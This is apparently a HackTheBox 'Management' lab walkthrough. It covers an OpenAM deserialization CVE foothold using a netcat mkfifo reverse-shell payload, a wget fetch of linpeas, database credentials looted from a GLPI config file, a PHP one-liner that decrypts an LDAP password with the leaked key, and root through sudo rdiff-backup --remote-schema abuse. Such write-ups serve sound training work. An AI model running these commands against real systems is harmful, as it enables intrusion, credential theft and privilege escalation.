## Context
HTB: Management
Diffucuilty: Easy
IP: `10.129.244.176`
Machine: Linux

## The Exploit: 
### Foothold: CVE-2026-33439
Any unautenticated user can request the endpoint `/openam/ui/PWResetUserValidation` with a crafted serailized JAVA object via GET or POST in the `jato.clientSession` parameter to any JATO ViewBean endpoint containing `<jato:form>` which in case here is the password reset page.

### Gaining user access:
There are critical credential leaked in the system that gives access to the encrupted hashes of the user's password and those files that can be read by any user in the system including the glipcrypt.key file creating a vulnerability of information leakage and improper identity level authorization. So writing a simple script and reversing the enryption will give the user password.

### Elevating the priviledges
A normal user can run a vulnerable `rdiff-backup` command with elevated priviledges and pairing this with the `--server` option makes the user create a backup of any file into any local/remote directory. So exploiting this escalated the priviledegs and gave out the root.


## Scanning and Enumeration
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
4444/tcp  open  ssl/ldap
50389/tcp open  ldap     (Anonymous bind OK)


## My Walkthrough:

1. There was a HTTP web page and which had a client login portal redirecting to `https://sso.management.htb/openam`. Add it to `/etc/hosts` file.

2. It was a OPENAM login portal. On inspecting the page there was the OpenAM version leaked into it `urlArgs : "v=16.0.5"`. Since it is an old version so my best idea was to check for recent exploits.

3. After some research and testing I got this `CVE-2026-33439` to be working in it. And got this POC: `CVE-2026-33439 Python PoC`.

4. Downlaod it and while running it asks for a command we can run as an attacker. Now we need a reverse shell that connects us to that machine so checking PentestMonkey's Reverse Shell cheatsheet I got this to be working
```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP YOUR-PORT >/tmp/f'
```

5. After getting a shell if you want to upgrade a basic reverse shell (like a netcat session) into a fully functional, interactive terminal first `Ctrl-Z` and suspend the session then use `stty raw -echo; fg` to bring up the session finally `export TERM=xterm`.

6. I got to know there was a user `owen` except it I can't find something else so I just exported lipneas.sh to the remote machine.
```bash
wget http://<YOUR-IP>:<YOUR-PORT>/linpeas.sh
```

7. After checking the linpeas results there I got password in the PHP file
```bash
/opt/glpi/config/config_db.php:   public $dbpassword = '8rh...';
```

8. After opening the config_db.php I got a username as well
```bash
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'g...';
   public $dbpassword = '8rh...';
   public $dbdefault = 'gl...';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

9. And I also got to know from the linpeas that there was a maraidb server running in the same machine. So I tried to mysql in the server using the credentals `$dbuser` and `$dbpassword`.
```bash
mysql -u '<$dbuser>' -p<$dbpassword>
```
10. I tried to see a database `show databases;` got a new database named `glpidb`. Then I used `use glpidb;` then I tried `show tables;` and found a really suspicious name in it i.e. `glpi_authldaps`.

11. I opened it and got a a hash for the column `rootdn_passwd`.

12. Now as I investigated about glpi I got to know that it is a open source, and I got an interesting `.key` file in the same directory. So I checked on github about this key file.

13. I came accross the decryption algorithm it was using `XCHACHA20POLY1305` encryption algorithm and understood that this dectyption can be done if I have the `.key` file which I already possessed.

14. Therefore I concluded that it can be solved with a simple script that can be written in the terminal only and gave all the credentials it needed and ran this script.
```bash
php -r "
> \$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
> \$ciphertext = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
> \$data = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
> \$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
> \$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
> echo \$plaintext . PHP_EOL;
> "
```

15. And I got something which looked like a password `Wpc...`. So I had a the username `owen` and using this as a password I tried to ssh into the system it succeeded and I fetched my `user.txt`.

16. Then I tried looking what priviledges are available to me I checked with `sudo -l` and got a suspicious output regarding a backup
```bash
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *

```
> rdiff-backup is a python based backup tool that creares a mirror of source directory while storing reverse diffs in hidden subdirectory for historical file recovery. It has a `--remote-schema` option which let users customize the command used to launch a remote server process instead of ssh connection and this paired with `--server` make this run as elevated priviledges and file overwrite can occur. 

17. So I have used this to send all the root file details in the `/tmp/root_backup`.
```bash
rdiff-backup \
--remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write #{h}' \
backup 'localhost::/root' /tmp/root_backup
```

18. And I got the `root.txt` in `/tmp/root_backup`.
The box is completed ;-)